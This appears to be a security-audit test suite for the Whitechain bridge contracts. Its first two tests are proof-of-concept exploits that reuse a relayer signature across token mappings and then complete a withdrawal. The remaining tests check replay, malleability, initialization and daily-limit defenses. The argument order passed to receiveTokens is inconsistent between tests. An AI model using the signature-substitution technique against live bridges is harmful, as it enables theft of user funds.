import hre from "hardhat";
import { expect } from "chai";
import { ZeroAddress } from "ethers";
import * as coreDeployment from "../../ignition/core/deployment";
import * as GlobalConfig from "../utils/GlobalConfig";
import { time } from "@nomicfoundation/hardhat-toolbox/network-helpers";

describe("Whitechain security PoCs", function () {
  let MapperContract: any;
  let BridgeContract: any;
  let deployer: any;
  let emergencyAddress: any;
  let multisigAddress: any;
  let relayerAddress: any;
  let user1: any;
  let Token0: any;
  let Token1: any;
  let Token2: any;

  const amount = 1000n;
  const gasAmount = 500n;

  async function deployToken(): Promise<any> {
    return await coreDeployment.deployContract(
      true,
      GlobalConfig.EXAMPLE_TOKEN_CONTRACT_NAME,
      deployer,
      [GlobalConfig.ETHER_1 * 100_000_000n]
    );
  }

  async function deployMapper(): Promise<any> {
    const initParams = {
      emergencyAddress: emergencyAddress.address,
      multisigAddress: multisigAddress.address,
    };

    const { contract } = await coreDeployment.deployUUPSProxy(
      true,
      GlobalConfig.MAIN_UTILS_ROUTE + "mapper/" + GlobalConfig.MAPPER_CONTRACT_NAME + ".sol:" + GlobalConfig.MAPPER_CONTRACT_NAME,
      deployer,
      "initialize",
      initParams
    );
    return contract;
  }

  async function deployBridge(mapper: any): Promise<any> {
    const initParams = {
      mapperAddress: await mapper.getAddress(),
      emergencyAddress: emergencyAddress.address,
      multisigAddress: multisigAddress.address,
      relayerAddress: relayerAddress.address,
    };

    const { contract } = await coreDeployment.deployUUPSProxy(
      true,
      GlobalConfig.BRIDGE_CONTRACT_NAME,
      deployer,
      "initialize",
      initParams
    );
    return contract;
  }

  function mapBytes(addr: string): string {
    return hre.ethers.zeroPadValue(addr, 32);
  }

  async function makeDepositMap(originToken: string, targetToken: string) {
    return {
      originChainId: BigInt(GlobalConfig.HARDHAT_ID),
      targetChainId: BigInt(GlobalConfig.HARDHAT_ID),
      depositType: 1,
      withdrawType: 0,
      originTokenAddress: mapBytes(originToken),
      targetTokenAddress: mapBytes(targetToken),
      useTransfer: false,
      isAllowed: true,
      isCoin: false,
    };
  }

  async function signBridgeParams(
    signer: any,
    bridgeParams: { mapId: bigint; amount: bigint; toAddress: string },
    mapInfo: any,
    gas: bigint
  ) {
    const now = BigInt(await time.latest());
    const deadline = now + 3600n;
    const salt = now + 3601n;
    const saltHex = hre.ethers.toBeHex(salt, 32);

    const message = hre.ethers.solidityPackedKeccak256(
      [
        "address",
        "bytes32",
        "bytes32",
        "uint256",
        "uint256",
        "uint256",
        "uint256",
        "uint64",
        "bytes32",
      ],
      [
        signer.address,
        bridgeParams.toAddress,
        mapInfo.targetTokenAddress,
        gas,
        bridgeParams.amount,
        mapInfo.originChainId,
        mapInfo.targetChainId,
        deadline,
        saltHex,
      ]
    );

    const signature = await relayerAddress.signMessage(hre.ethers.getBytes(message));
    const parsed = hre.ethers.Signature.from(signature);

    return {
      r: parsed.r,
      s: parsed.s,
      v: parsed.v,
      salt: saltHex,
      deadline,
    };
  }

  beforeEach(async function () {
    [
      deployer,
      emergencyAddress,
      multisigAddress,
      relayerAddress,
      user1,
    ] = await hre.ethers.getSigners();

    Token0 = await deployToken();
    Token1 = await deployToken();
    Token2 = await deployToken();

    await (await Token1.connect(user1).requestTokens()).wait();
    await (await Token2.connect(user1).requestTokens()).wait();

    MapperContract = await deployMapper();
    BridgeContract = await deployBridge(MapperContract);
  });

  it("PoC: a relayer signature for origin token A is accepted for origin token B when both map to the same target token", async function () {
    const originA = await Token1.getAddress();
    const originB = await Token2.getAddress();
    const target = await Token0.getAddress();

    const mapA = await makeDepositMap(originA, target);
    const mapB = await makeDepositMap(originB, target);

    await (await MapperContract.connect(multisigAddress).registerMapping(mapA)).wait();
    await (await MapperContract.connect(multisigAddress).registerMapping(mapB)).wait();

    const mapAId = 1n;
    const mapBId = 2n;
    const mapInfoA = await MapperContract.mapInfo(mapAId);

    const toAddress = mapBytes(user1.address);
    const bridgeParamsA = { mapId: mapAId, amount, toAddress };
    const signature = await signBridgeParams(user1, bridgeParamsA, mapInfoA, gasAmount);

    await (await Token2.connect(user1).approve(await BridgeContract.getAddress(), amount)).wait();

    const bridgeParamsB = { mapId: mapBId, amount, toAddress };
    const tx = await BridgeContract.connect(user1).bridgeTokens(
      [bridgeParamsB, signature],
      { value: gasAmount }
    );

    await expect(tx)
      .to.emit(BridgeContract, "Deposit")
      .withArgs(
        mapBytes(user1.address),
        toAddress,
        mapBytes(originB),
        mapBytes(target),
        amount,
        GlobalConfig.HARDHAT_ID,
        GlobalConfig.HARDHAT_ID
      );

    expect(await Token2.balanceOf(await BridgeContract.getAddress())).to.equal(amount);
  });

  it("PoC: the substituted mapping can complete the withdrawal leg with the relayer role", async function () {
    const originA = await Token1.getAddress();
    const originB = await Token2.getAddress();
    const target = await Token0.getAddress();

    const mapA = await makeDepositMap(originA, target);
    const mapB = await makeDepositMap(originB, target);

    await (await MapperContract.connect(multisigAddress).registerMapping(mapA)).wait();
    await (await MapperContract.connect(multisigAddress).registerMapping(mapB)).wait();

    const sourceMapInfo = await MapperContract.mapInfo(1n);
    const toAddress = mapBytes(user1.address);
    const signature = await signBridgeParams(
      user1,
      { mapId: 1n, amount, toAddress },
      sourceMapInfo,
      gasAmount
    );

    await (await Token2.connect(user1).approve(await BridgeContract.getAddress(), amount)).wait();

    await expect(
      BridgeContract.connect(user1).bridgeTokens(
        [{ mapId: 2n, amount, toAddress }, signature],
        { value: gasAmount }
      )
    ).to.not.be.reverted;

    const TargetMapper = await deployMapper();
    const TargetBridge = await deployBridge(TargetMapper);

    const withdrawMap = {
      originChainId: BigInt(GlobalConfig.HARDHAT_ID),
      targetChainId: BigInt(GlobalConfig.HARDHAT_ID),
      depositType: 0,
      withdrawType: 1,
      originTokenAddress: mapBytes(originB),
      targetTokenAddress: mapBytes(target),
      useTransfer: false,
      isAllowed: true,
      isCoin: false,
    };

    await (await TargetMapper.connect(multisigAddress).registerMapping(withdrawMap)).wait();
    await (await TargetBridge.connect(multisigAddress).setDailyLimit(
      mapBytes(target),
      relayerAddress.address,
      amount * 2n
    )).wait();

    await (await Token0.mint(await TargetBridge.getAddress(), amount)).wait();

    const before = await Token0.balanceOf(user1.address);
    await (
      await TargetBridge.connect(relayerAddress).receiveTokens([
        mapBytes(user1.address),
        toAddress,
        amount,
        1n,
        mapBytes(user1.address),
      ])
    ).wait();

    expect(await Token0.balanceOf(user1.address)).to.equal(before + amount);
  });

  it("Rejects mutation of amount or gasAmount under the existing signature", async function () {
    const origin = await Token1.getAddress();
    const target = await Token0.getAddress();
    const mapA = await makeDepositMap(origin, target);
    await (await MapperContract.connect(multisigAddress).registerMapping(mapA)).wait();

    const mapInfo = await MapperContract.mapInfo(1n);
    const toAddress = mapBytes(user1.address);
    const signature = await signBridgeParams(
      user1,
      { mapId: 1n, amount, toAddress },
      mapInfo,
      gasAmount
    );

    await (await Token1.connect(user1).approve(await BridgeContract.getAddress(), amount * 2n)).wait();

    await expect(
      BridgeContract.connect(user1).bridgeTokens(
        [{ mapId: 1n, amount: amount + 1n, toAddress }, signature],
        { value: gasAmount }
      )
    ).to.be.reverted;

    await expect(
      BridgeContract.connect(user1).bridgeTokens(
        [{ mapId: 1n, amount, toAddress }, signature],
        { value: gasAmount + 1n }
      )
    ).to.be.reverted;
  });

  it("Rejects the same signed payload twice", async function () {
    const origin = await Token1.getAddress();
    const target = await Token0.getAddress();
    const mapA = await makeDepositMap(origin, target);
    await (await MapperContract.connect(multisigAddress).registerMapping(mapA)).wait();

    const mapInfo = await MapperContract.mapInfo(1n);
    const toAddress = mapBytes(user1.address);
    const signature = await signBridgeParams(
      user1,
      { mapId: 1n, amount, toAddress },
      mapInfo,
      gasAmount
    );

    await (await Token1.connect(user1).approve(await BridgeContract.getAddress(), amount * 2n)).wait();

    const params = [{ mapId: 1n, amount, toAddress }, signature];
    await (await BridgeContract.connect(user1).bridgeTokens(params, { value: gasAmount })).wait();

    await expect(
      BridgeContract.connect(user1).bridgeTokens(params, { value: gasAmount })
    ).to.be.revertedWith("Bridge: Hash already used");
  });

  it("Rejects a high-s malleated signature", async function () {
    const origin = await Token1.getAddress();
    const target = await Token0.getAddress();
    const mapA = await makeDepositMap(origin, target);
    await (await MapperContract.connect(multisigAddress).registerMapping(mapA)).wait();

    const mapInfo = await MapperContract.mapInfo(1n);
    const toAddress = mapBytes(user1.address);
    const signature = await signBridgeParams(
      user1,
      { mapId: 1n, amount, toAddress },
      mapInfo,
      gasAmount
    );

    const secp256k1N = BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141");
    const highS = hre.ethers.toBeHex(secp256k1N - BigInt(signature.s) + 1n, 32);
    const highV = signature.v === 27 ? 28 : 27;

    await expect(
      BridgeContract.connect(user1).bridgeTokens(
        [{ mapId: 1n, amount, toAddress }, { ...signature, s: highS, v: highV }],
        { value: gasAmount }
      )
    ).to.be.reverted;
  });

  it("Implementation cannot be initialized directly", async function () {
    const BridgeFactory = await hre.ethers.getContractFactory(GlobalConfig.BRIDGE_CONTRACT_NAME);
    const implementation = await BridgeFactory.deploy();
    await implementation.waitForDeployment();

    const initParams = {
      mapperAddress: await MapperContract.getAddress(),
      emergencyAddress: ZeroAddress,
      multisigAddress: multisigAddress.address,
      relayerAddress: relayerAddress.address,
    };

    await expect(implementation.initialize(initParams)).to.be.revertedWith(
      "Initializable: contract is already initialized"
    );
  });

  it("Cannot bypass the daily limit by moving the timestamp window", async function () {
    const origin = await Token1.getAddress();
    const target = await Token0.getAddress();
    const mapA = await makeDepositMap(origin, target);
    await (await MapperContract.connect(multisigAddress).registerMapping(mapA)).wait();

    // This is a withdraw-side check: it validates the current-window accounting path.
    const TargetMapper = await deployMapper();
    const TargetBridge = await deployBridge(TargetMapper);

    const withdrawMap = {
      originChainId: BigInt(GlobalConfig.HARDHAT_ID),
      targetChainId: BigInt(GlobalConfig.HARDHAT_ID),
      depositType: 0,
      withdrawType: 1,
      originTokenAddress: mapBytes(origin),
      targetTokenAddress: mapBytes(target),
      useTransfer: false,
      isAllowed: true,
      isCoin: false,
    };

    await (await TargetMapper.connect(multisigAddress).registerMapping(withdrawMap)).wait();
    await (await TargetBridge.connect(multisigAddress).setDailyLimit(
      mapBytes(target),
      relayerAddress.address,
      amount
    )).wait();

    await (await Token0.mint(await TargetBridge.getAddress(), amount * 2n)).wait();

    await (await TargetBridge.connect(relayerAddress).receiveTokens([
      mapBytes("0x0000000000000000000000000000000000000001"),
      1n,
      amount,
      mapBytes(user1.address),
      mapBytes(user1.address),
    ])).wait();

    await expect(
      TargetBridge.connect(relayerAddress).receiveTokens([
        mapBytes("0x0000000000000000000000000000000000000002"),
        1n,
        1n,
        mapBytes(user1.address),
        mapBytes(user1.address),
      ])
    ).to.be.revertedWith("Bridge: Daily limit exceeded");

    await hre.ethers.provider.send("evm_increaseTime", [86400]);
    await hre.ethers.provider.send("evm_mine", []);

    await expect(
      TargetBridge.connect(relayerAddress).receiveTokens([
        mapBytes("0x0000000000000000000000000000000000000003"),
        1n,
        1n,
        mapBytes(user1.address),
        mapBytes(user1.address),
      ])
    ).to.not.be.reverted;
  });
});
